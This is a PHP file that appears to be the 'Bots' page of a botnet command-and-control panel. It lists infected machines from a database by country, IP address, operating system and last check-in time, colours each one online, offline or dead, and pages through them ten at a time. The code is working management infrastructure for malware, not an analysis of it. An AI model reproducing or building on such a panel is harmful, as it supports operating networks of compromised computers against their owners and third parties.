<?php
$TEMPLATE['site'] = "Bots";
$TEMPLATE['text'] = '<table class="table table-hover">
						<tr>
							<th>#</th>
							<th>Country</th>
							<th>IP</th>
							<th>OS</th>
							<th>Date</th>
						</tr>';
$LIMIT = isset($_GET['n']) ? sprintf("%d, %d", intval($_GET['n']), (intval($_GET['n']) + 10)) : '0, 10';
$stmt = db_query("SELECT *,
					(SELECT `bots`.`date` >= CURRENT_TIMESTAMP - INTERVAL :2 MINUTE) as `online`,
					(SELECT `bots`.`date` < CURRENT_TIMESTAMP - INTERVAL :3 DAY) as `dead`
				FROM `bots` WHERE `uid` = :1 OR `uid` = -1 ORDER BY `date` DESC LIMIT ".$LIMIT, getUID(), $GLOBALS['conn_int'], $GLOBALS['dead_int']);
while ($row = $stmt->fetch())
{
	$TEMPLATE['text'] .= "			<tr style=\"color: ".($row['online'] ? "green" : ($row['dead'] ? "gray" : "red")).";\">
										<td>{$row['id']}</td>
										<td>{$row['country']}</td>
										<td>{$row['IP']}</td>
										<td>{$row['OS']}</td>
										<td>{$row['date']}</td>
									</tr>";
}
$TEMPLATE['text'] .= '			</table>
<div class="btn-group">
	<a href="?p=bots&n='.((isset($_GET['n']) && intval($_GET['n']) >= 10) ? intval($_GET['n']) - 10 : 0).'"><button type="button" class="btn btn-default">Back</button></a>
	<a href="?p=bots&n='.(isset($_GET['n']) ? intval($_GET['n']) + 10 : 10).'"><button type="button" class="btn btn-default">Next</button></a>
</div>';
					
					
$TEMPLATE['js'] = '';
?>